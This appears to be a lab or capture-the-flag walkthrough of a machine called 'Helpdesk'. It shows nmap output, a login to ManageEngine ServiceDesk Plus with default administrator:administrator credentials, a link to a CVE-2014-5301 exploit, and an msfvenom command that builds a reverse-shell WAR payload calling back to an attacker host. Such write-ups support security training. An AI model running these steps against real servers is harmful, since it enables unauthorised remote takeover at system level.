# Helpdesk
### Enumeration
```
# Nmap 7.92 scan initiated Wed Apr 20 19:01:41 2022 as: nmap -sCV -v -p- -oN tcp.out 192.168.201.43
Nmap scan report for ip-192-168-201-43.eu-west-1.compute.internal (192.168.201.43)
Host is up (0.015s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
|_http-title: ManageEngine ServiceDesk Plus
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s
| smb2-time:
|   date: 2022-04-20T19:06:05
|_  start_date: 2022-04-20T19:01:25
| smb2-security-mode:
|   2.0.2:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-20T12:06:05-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ba:58:d4 (VMware)
| Names:
|   HELPDESK<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  HELPDESK<20>         Flags: <unique><active>

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 20 19:06:44 2022 -- 1 IP address (1 host up) scanned in 303.43 seconds
```

##### 8080
Webserver running ManageEngine ServiceDesk Plus 7.6.0. Looking for default credentials, we find `administrator:administrator`, which work to login. There's also an authenticated RCE vulnerability in this version (CVE-2014-5301), and I found an exploit on [GitHub](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py).

The exploit required first generating a payload using `msfvenom`:

```
msfvenom -p java/reverse_shell_tcp LHOST=192.168.49.219 LPORT=9001 -f war > shell.war
```

Then I ran the exploit after setting up a netcat listener on port 9001, and got a shell as `nt authority\system`.